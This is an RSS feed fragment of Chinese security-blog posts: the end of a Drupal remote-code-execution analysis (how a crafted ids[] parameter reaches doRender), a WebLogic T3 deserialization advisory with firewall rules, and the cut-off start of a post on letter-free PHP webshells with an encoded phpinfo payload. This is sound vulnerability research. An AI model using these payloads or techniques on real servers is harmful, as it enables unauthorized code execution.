data-rawwidth=&quot;899&quot; data-rawheight=&quot;519&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-0e1b7dd67bcb506273b25b1c7c0b639e&quot; data-watermark-src=&quot;v2-167a79f31729198a7e347ba20867f092&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;修改一下传递参数 &lt;code class=&quot;inline&quot;&gt;contextual-views-field-links&lt;/code&gt; 内容：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-f10d0d25f7f4f0db48c296362615f3b6_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;853&quot; data-rawheight=&quot;30&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;成功设置 &lt;code class=&quot;inline&quot;&gt;$link_element&lt;/code&gt; 变量。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-4abafaeccfa0bc7f5def4747e406a543_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;893&quot; data-rawheight=&quot;485&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-4abafaeccfa0bc7f5def4747e406a543&quot; data-watermark-src=&quot;v2-7865eaca0977e37f94350166fc8fa54f&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-0d4bed8a9dd97e0cf050fb616bbcbffb_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;900&quot; data-rawheight=&quot;451&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-0d4bed8a9dd97e0cf050fb616bbcbffb&quot; data-watermark-src=&quot;v2-050ae32875c67b5206b3d8e856b5717b&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;最后设置给了 &lt;code class=&quot;inline&quot;&gt;$variables[&#39;links&#39;]&lt;/code&gt; &lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-f04b6ad790b32f3dcc671db4d883b0e6_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;898&quot; data-rawheight=&quot;468&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-f04b6ad790b32f3dcc671db4d883b0e6&quot; data-watermark-src=&quot;v2-c3598c57e67f14747fbce9a55b3046a9&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;最终进入页面render过程。&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-e953e65a6f6e32f72f237199ea53183f_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;901&quot; data-rawheight=&quot;522&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-e953e65a6f6e32f72f237199ea53183f&quot; data-watermark-src=&quot;v2-1519ed6fe36abb69caf3cbbd2cb437d2&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;调用栈如下：&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-f192def370cf69a37ad21a38c21de1b0_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;893&quot; data-rawheight=&quot;391&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-f192def370cf69a37ad21a38c21de1b0&quot; data-watermark-src=&quot;v2-1071755c923af33f4b1a37defeb4dfb4&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;code class=&quot;inline&quot;&gt;$context&lt;/code&gt; 内容如下：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-11e6fba5c84330441280f2f079efb8dc_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;899&quot; data-rawheight=&quot;463&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-11e6fba5c84330441280f2f079efb8dc&quot; data-watermark-src=&quot;v2-11eecaa54fd0e66f8087544d520f028c&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;之后代码简化如下：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-8c88d1e6d921c09d9ac2e76c7ee7c8b0_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;798&quot; data-rawheight=&quot;474&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-8c88d1e6d921c09d9ac2e76c7ee7c8b0&quot; data-watermark-src=&quot;v2-9eea36452585440adc42341d111aad3d&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;首先将 &lt;code class=&quot;inline&quot;&gt;$context[&quot;links&quot;]&lt;/code&gt; 赋值给 &lt;code class=&quot;inline&quot;&gt;$context[&#39;_seq&#39;]&lt;/code&gt;，接着遍历键值对并根据是否包含相应的属性(&lt;code class=&quot;inline&quot;&gt;links&lt;/code&gt;, &lt;code class=&quot;inline&quot;&gt;text_attributes&lt;/code&gt;)进入不同的条件语句中，传递不同的属性值给 &lt;code class=&quot;inline&quot;&gt;escapeFilter&lt;/code&gt; 函数。&lt;/p&gt;&lt;p&gt;这里由于包含 &lt;code class=&quot;inline&quot;&gt;link&lt;/code&gt; 属性，即传递 &lt;code class=&quot;inline&quot;&gt;$context[&quot;item&quot;][&quot;link&quot;]&lt;/code&gt; &lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-673387371a36bc269c3968e58795ba09_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;899&quot; data-rawheight=&quot;492&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-673387371a36bc269c3968e58795ba09&quot; data-watermark-src=&quot;v2-8a8477eafc875971b350b2594be65766&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;之后跟进 &lt;code class=&quot;inline&quot;&gt;escapeFilter&lt;/code&gt;，该函数将通过 &lt;code class=&quot;inline&quot;&gt;$arg&lt;/code&gt; 变量类型来返回不同的值。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-f8823d64ee40acf0d61759c228ceb422_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;794&quot; data-rawheight=&quot;826&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-f8823d64ee40acf0d61759c228ceb422&quot; data-watermark-src=&quot;v2-91fd439662d2ac6702402342e8654c82&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-b514e3819ac6a413e769fad64cabbedd_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;793&quot; data-rawheight=&quot;403&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-b514e3819ac6a413e769fad64cabbedd&quot; data-watermark-src=&quot;v2-375ff5ff6e3d4f22d3b9ff53c55f4b9c&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;该代码中可以看到，因为&lt;code class=&quot;inline&quot;&gt;$arg&lt;/code&gt;为数组, 所以&lt;code class=&quot;inline&quot;&gt;is_scalar($arg)=false&lt;/code&gt;，使得&lt;code class=&quot;inline&quot;&gt;$return=NULL&lt;/code&gt;，从而进入最后的&lt;code class=&quot;inline&quot;&gt;$this-&amp;gt;renderer-&amp;gt;render($arg)&lt;/code&gt;&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-fceba98c1c6a419c8a3bf740743f509f_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;897&quot; data-rawheight=&quot;359&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-fceba98c1c6a419c8a3bf740743f509f&quot; data-watermark-src=&quot;v2-6b46e74888dd9ad8fdd17063279b0fb4&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;code class=&quot;inline&quot;&gt;$this-&amp;gt;renderer-&amp;gt;render&lt;/code&gt; 即为熟悉的 &lt;code class=&quot;inline&quot;&gt;doRender&lt;/code&gt; &lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-83964f1d87330b4db7fb412fa36406c8_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;899&quot; data-rawheight=&quot;462&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-83964f1d87330b4db7fb412fa36406c8&quot; data-watermark-src=&quot;v2-ca1546039912ac83b74d3f2be6c8e170&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;所以综上可知 &lt;code class=&quot;inline&quot;&gt;$context[&quot;item&quot;]&lt;/code&gt; 的属性将会传递给 &lt;code class=&quot;inline&quot;&gt;doRender&lt;/code&gt; 函数，只要完全控制属性值内容即可控制 &lt;code class=&quot;inline&quot;&gt;doRender&lt;/code&gt; 函数的 &lt;code class=&quot;inline&quot;&gt;$elements&lt;/code&gt; 变量，从而达到RCE的目的，但是这里传递的是 &lt;code class=&quot;inline&quot;&gt;link&lt;/code&gt; 属性，并不完全可控。&lt;/p&gt;&lt;p&gt;回到前面 &lt;code class=&quot;inline&quot;&gt;if&lt;/code&gt; 条件判断，如果不包含 &lt;code class=&quot;inline&quot;&gt;links&lt;/code&gt; 属性的时候将会传递 &lt;code class=&quot;inline&quot;&gt;text&lt;/code&gt; 属性，而 &lt;code class=&quot;inline&quot;&gt;text&lt;/code&gt; 属性值内容完全可控，所以可以利用 &lt;code class=&quot;inline&quot;&gt;text&lt;/code&gt; 属性来达到rce的目的。&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-d400b5d0d57494fd26569823b38ba51a_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;787&quot; data-rawheight=&quot;472&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-d400b5d0d57494fd26569823b38ba51a&quot; data-watermark-src=&quot;v2-62c80576c8bfa650f7504ddfd89eecf5&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-7db9dd670d77ed6ebe76face77401e41_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;903&quot; data-rawheight=&quot;395&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-7db9dd670d77ed6ebe76face77401e41&quot; data-watermark-src=&quot;v2-728ac9aaca1624f9719451a6c83d75d5&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;要想使得没有 &lt;code class=&quot;inline&quot;&gt;link&lt;/code&gt; 属性在 &lt;code class=&quot;inline&quot;&gt;template_preprocess_links&lt;/code&gt; 函数中可以看到，当没有 &lt;code class=&quot;inline&quot;&gt;url&lt;/code&gt; 时，将不会设置 &lt;code class=&quot;inline&quot;&gt;$item[&#39;link&#39;]&lt;/code&gt; &lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-59cf6a8c057435fac4685ca9e0a7f75a_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;901&quot; data-rawheight=&quot;479&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-59cf6a8c057435fac4685ca9e0a7f75a&quot; data-watermark-src=&quot;v2-7579b00615c1b58d97f2509a48848295&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;所以只需删除请求参数 &lt;code class=&quot;inline&quot;&gt;ids[]&lt;/code&gt; 中的 &lt;code class=&quot;inline&quot;&gt;url&lt;/code&gt; 部分即可，并且将 &lt;code class=&quot;inline&quot;&gt;title&lt;/code&gt; 值内容修改为数组：&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-168b78d1f577c969273379f20b26f7b0_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;794&quot; data-rawheight=&quot;76&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;得到：&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-f9bddf12e4751ee08cd1e566da579f79_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;796&quot; data-rawheight=&quot;78&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;可以看到 &lt;code class=&quot;inline&quot;&gt;item&lt;/code&gt; 没有 &lt;code class=&quot;inline&quot;&gt;link&lt;/code&gt; 属性了。&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-a846241a3b0775619950813fe271f1bd_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;897&quot; data-rawheight=&quot;407&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-a846241a3b0775619950813fe271f1bd&quot; data-watermark-src=&quot;v2-f4967ade222794872bef54fe37894564&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;进入 &lt;code class=&quot;inline&quot;&gt;render&lt;/code&gt; 函数&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-82ad92b64b69eb040d5819221c00fd7d_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;896&quot; data-rawheight=&quot;288&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-82ad92b64b69eb040d5819221c00fd7d&quot; data-watermark-src=&quot;v2-f7aa9bcc9ab4e4d7780c90190758642e&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;从而控制了 &lt;code class=&quot;inline&quot;&gt;doRender&lt;/code&gt; 函数的 &lt;code class=&quot;inline&quot;&gt;$elements&lt;/code&gt; 参数内容，之后可通过设置 &lt;code class=&quot;inline&quot;&gt;#pre_render&lt;/code&gt; 等属性达到rce的目的。&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-3b850931cd0fed4fcb3d62e6951358ce_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;898&quot; data-rawheight=&quot;348&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-3b850931cd0fed4fcb3d62e6951358ce&quot; data-watermark-src=&quot;v2-d1c9489ac70db08c05090a8b61e559dd&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;h2&gt;&lt;b&gt;0x06 RCE&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;这里不提供完整exp，顺带说明一下这里只是通过commit调试下来的结果，并不清楚触发点是否与原漏洞发现者相同。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-0f9b120624cdd6cfcad36fe482b4b9ef_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;897&quot; data-rawheight=&quot;456&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-0f9b120624cdd6cfcad36fe482b4b9ef&quot; data-watermark-src=&quot;v2-80665cc651315f7453e7b426092dcb3b&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;h2&gt;&lt;b&gt;0x07 漏洞修复状况&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;官方通过验证签名 `token` 的方式，使得 `token` 错误导致无法利用。&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-391f591d0482049426bd71cd42945ba9_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;483&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-391f591d0482049426bd71cd42945ba9&quot; data-watermark-src=&quot;v2-998fe0812c08be831fec7d54526bb44b&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>婴宁</author>
<guid isPermaLink="false">2018-11-13-49558602</guid>
<pubDate>Tue, 13 Nov 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>漏洞预警 | WebLogic 多个高危漏洞</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-10-17-46975502.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/46975502&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-d67fbd0aa4bb109493abc8c24b706220_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;h2&gt;&lt;b&gt;事件来源&lt;/b&gt;&lt;br&gt; &lt;/h2&gt;&lt;p&gt;Oracle 官方在 10 月 16 日发布了严重补丁更新 CPU（Critical Patch Update），其中有 5 个针对 WebLogic Server 的高危漏洞，官方危害评级 9.8 分：&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://www.oracle.com/technetwork/security-advisory/cpuoct2018-4428296.html&quot;&gt;https://www.oracle.com/technetwork/security-advisory/cpuoct2018-4428296.html&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;漏洞描述&lt;/b&gt;&lt;br&gt; &lt;/h2&gt;&lt;ul&gt;&lt;li&gt;CVE-2018-3191&lt;/li&gt;&lt;li&gt;CVE-2018-3197&lt;/li&gt;&lt;li&gt;CVE-2018-3201&lt;/li&gt;&lt;li&gt;CVE-2018-3245&lt;/li&gt;&lt;li&gt;CVE-2018-3252&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;上述 5 个漏洞都是官方危害评级 9.8 分的高危漏洞，并且可以在远程并且未授权的状态下进行利用。它们均针对 WebLogic Server 的 WSL 核心组件，并通过 T3 协议进行利用。&lt;/p&gt;&lt;p&gt;尽管目前暂无漏洞相关具体信息，不过根据 WebLogic 以往的历史漏洞，可以判断这些漏洞仍是针对 WebLogic 反序列化类黑名单进行绕过。攻击者通过利用 T3 协议对反序列化对象进行封装发到 WebLogic 服务端口，当 WebLogic 服务端对 T3 协议数据进行处理时，即会触发反序列化漏洞。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;影响范围&lt;/b&gt;&lt;br&gt; &lt;/h2&gt;&lt;ul&gt;&lt;li&gt;CVE-2018-3191 影响 WebLogic 10.3.6.0, 12.1.3.0, 12.2.1.3 版本。&lt;/li&gt;&lt;li&gt;CVE-2018-3197 影响 WebLogic 12.1.3.0 版本。&lt;/li&gt;&lt;li&gt;CVE-2018-3201 影响 WebLogic 12.2.1.3 版本。&lt;/li&gt;&lt;li&gt;CVE-2018-3245 影响 WebLogic 10.3.6.0, 12.1.3.0, 12.2.1.3 版本。&lt;/li&gt;&lt;li&gt;CVE-2018-3252 影响 WebLogic 10.3.6.0, 12.1.3.0, 12.2.1.3 版本。&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;解决方案&lt;/b&gt;&lt;br&gt; &lt;/h2&gt;&lt;p&gt;使用 Oracle 官方安全补丁进行更新修复：&lt;br&gt;&lt;a href=&quot;https://www.oracle.com/technetwork/security-advisory/cpuoct2018-4428296.html&quot;&gt;https://www.oracle.com/technetwork/security-advisory/cpuoct2018-4428296.html&lt;/a&gt;&lt;/p&gt;&lt;p&gt;由于 WebLogic 基于 T3/T3S 协议利用的反序列化漏洞层出不穷，在确认不影响业务的情况下可以考虑配置 WebLogic 对外部禁用 T3/T3S 协议。&lt;/p&gt;&lt;p&gt;配置 WebLogic 对外部禁用 T3/T3S 协议的具体步骤：&lt;/p&gt;&lt;p&gt;登入 WebLogic 控制台，在对应域设置中选择 “安全”-“筛选器” 选项卡：&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-270f4051cd4eea95d62be585850e7d16_r.jpg&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;562&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-270f4051cd4eea95d62be585850e7d16&quot; data-watermark-src=&quot;v2-98c3bfbb141730de844e9c98fb0c0ed7&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;在 “连接筛选器” 输入框中输入：&lt;/p&gt;&lt;p&gt;weblogic.security.net.ConnectionFilterImpl&lt;/p&gt;&lt;p&gt;在 “连接筛选器规则” 输入框中输入（即配置为仅允许本机使用 T3/T3S 协议通信，禁用除本机以外其他主机使用 T3/T3S 协议通信）：&lt;/p&gt;&lt;p&gt;127.0.0.1 * * allow t3 t3s&lt;/p&gt;&lt;p&gt;0.0.0.0/0 * * deny t3 t3s&lt;/p&gt;&lt;p&gt;输入后保存提交即可。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;参考资料&lt;/b&gt;&lt;br&gt; &lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.oracle.com/technetwork/security-advisory/cpuoct2018-4428296.html&quot;&gt;https://www.oracle.com/technetwork/security-advisory/cpuoct2018-4428296.html&lt;/a&gt;&lt;/p&gt;&lt;hr&gt;&lt;p&gt;&lt;b&gt;长 亭 应 急 响 应 服 务&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;全力进行产品升级&lt;/p&gt;&lt;p&gt;及时将预警预案发送给客户&lt;/p&gt;&lt;p&gt;检测业务是否受到此次漏洞影响&lt;/p&gt;&lt;p&gt;请联系长亭应急团队&lt;/p&gt;&lt;p&gt;7*24小时，守护您的安全！&lt;/p&gt;&lt;p&gt;第一时间找到我们：&lt;/p&gt;&lt;p&gt;&lt;b&gt;邮箱：support@chaitin.com&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;应急响应热线：4000-327-707&lt;/b&gt;&lt;/p&gt;</description>
<author>婴宁</author>
<guid isPermaLink="false">2018-10-17-46975502</guid>
<pubDate>Wed, 17 Oct 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>无字母数字webshell之提高篇</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-10-17-46806125.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/46806125&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-1778d4b36ffe296eb341235973267fda_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;作者： &lt;a class=&quot;member_mention&quot; href=&quot;http://www.zhihu.com/people/6f8ffd80705c262c2ee3fa4d9b3f8f06&quot; data-hash=&quot;6f8ffd80705c262c2ee3fa4d9b3f8f06&quot; data-hovercard=&quot;p$b$6f8ffd80705c262c2ee3fa4d9b3f8f06&quot;&gt;@周佩雨&lt;/a&gt; &lt;/p&gt;&lt;p&gt;[ Phith0n，现就职于长亭科技，长期关注并笔耕于安全编码、代码审计等方向]&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;前几天【&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/code-auditor-secret-group.html&quot;&gt;代码审计知识星球&lt;/a&gt;】里有同学提出了一个问题，大概代码如下：&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-eb5cc03bcc57e155992866ddd0ca2f13_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;550&quot; data-rawheight=&quot;442&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-eb5cc03bcc57e155992866ddd0ca2f13&quot; data-watermark-src=&quot;v2-7f1a731c76f642b186fddff0387fec0a&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;这个代码如果要getshell，怎样利用？&lt;/p&gt;&lt;p&gt;这题可能来自是我曾写过的一篇文章：《&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html&quot;&gt;一些不包含数字和字母的webshell&lt;/a&gt;》，里面介绍了如何构造无字母数字的webshell。其中有两个主要的思路：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;利用位运算&lt;/li&gt;&lt;li&gt;利用自增运算符&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;当然，这道题多了两个限制：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;webshell长度不超过35位&lt;/li&gt;&lt;li&gt;除了不包含字母数字，还不能包含&lt;code class=&quot;inline&quot;&gt;$&lt;/code&gt;和&lt;code class=&quot;inline&quot;&gt;_&lt;/code&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;难点呼之欲出了，我前面文章中给出的所有方法，都用到了PHP中的变量，需要对变量进行变形、异或、取反等操作，最后动态执行函数。但现在，因为&lt;code class=&quot;inline&quot;&gt;$&lt;/code&gt;不能使用了，所以我们无法构造PHP中的变量。&lt;/p&gt;&lt;p&gt;所以，如何解决这个问题？&lt;/p&gt;&lt;h2&gt;&lt;b&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html#php7&quot;&gt;PHP7 下简单解决问题&lt;/a&gt;&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;我们将上述代码放在index.php中，然后执行&lt;code class=&quot;inline&quot;&gt;docker run --rm -p 9090:80 -v `pwd`:/var/www/html php:7.2-apache&lt;/code&gt;，启动一个php 7.2的服务器。&lt;/p&gt;&lt;p&gt;php7中修改了表达式执行的顺序：&lt;a href=&quot;http://php.net/manual/zh/migration70.incompatible.php&quot;&gt;http://php.net/manual/zh/migration70.incompatible.php&lt;/a&gt; &lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-c5be0e9ab661cd441ef5f646421286ee_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;328&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-c5be0e9ab661cd441ef5f646421286ee&quot; data-watermark-src=&quot;v2-60436a6adec5c434f06407f98ebb01eb&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;PHP7前是不允许用&lt;code class=&quot;inline&quot;&gt;($a)();&lt;/code&gt;这样的方法来执行动态函数的，但PHP7中增加了对此的支持。所以，我们可以通过&lt;code class=&quot;inline&quot;&gt;(&#39;phpinfo&#39;)();&lt;/code&gt;来执行函数，第一个括号中可以是任意PHP表达式。&lt;/p&gt;&lt;p&gt;所以很简单了，构造一个可以生成&lt;code class=&quot;inline&quot;&gt;phpinfo&lt;/code&gt;这个字符串的PHP表达式即可。payload如下（不可见字符用url编码表示）：&lt;/p&gt;&lt;p&gt;(~%8F%97%8F%96%91%99%90)(); &lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-79d5efef73e8ef691585251e82cadd5a_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;235&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-79d5efef73e8ef691585251e82cadd5a&quot; data-watermark-src=&quot;v2-1de91572067dbce8ee60057e1e2ad6d8&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html#php5&quot;&gt;PHP5的思考&lt;/a&gt;&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;我们使用&lt;code class=&quot;inline&quot;&gt;docker run --rm -p 9090:80 -v `pwd`:/var/www/html php:5.6-apach&lt;/code&gt;来运行一个php5.6的web环境。&lt;/p&gt;&lt;p&gt;此时，我们尝试用PHP7的payload，将会得到一个错误：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-1650a681e30b3a66f9b9c112d239a3b4_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;134&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-1650a681e30b3a66f9b9c112d239a3b4&quot; data-watermark-src=&quot;v2-6d0e39d3694a0eb6ee5a942bbcdaba4d&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;原因就是php5并不支持这种表达方式。&lt;/p&gt;&lt;p&gt;在我在知识星球里发出帖子的时候，其实还没想到如何用PHP5解决问题，但我有自信解决它，所以先发了这个小挑战。后来关上电脑仔细想想，发现当思路禁锢在一个点的时候，你将会钻进牛角尖；当你用大局观来看待问题，问题就迎刃而解。&lt;/p&gt;&lt;p&gt;当然，我觉得我的方法应该不是唯一的，不过一直没人出来公布答案，我就先抛砖引玉了。&lt;/p&gt;&lt;p&gt;大部分语言都不会是单纯的逻辑语言，一门全功能的语言必然需要和操作系统进行交互。操作系统里包含的最重要的两个功能就是“shell（系统命令）”和“文件系统”，很多木马与远控其实也只实现了这两个功能。&lt;/p&gt;&lt;p&gt;PHP自然也能够和操作系统进行交互，“反引号”就是PHP中最简单的执行shell的方法。那么，在使用PHP无法解决问题的情况下，为何不考虑用“反引号”+“shell”的方式来getshell呢？&lt;/p&gt;&lt;h2&gt;&lt;b&gt;&lt;a 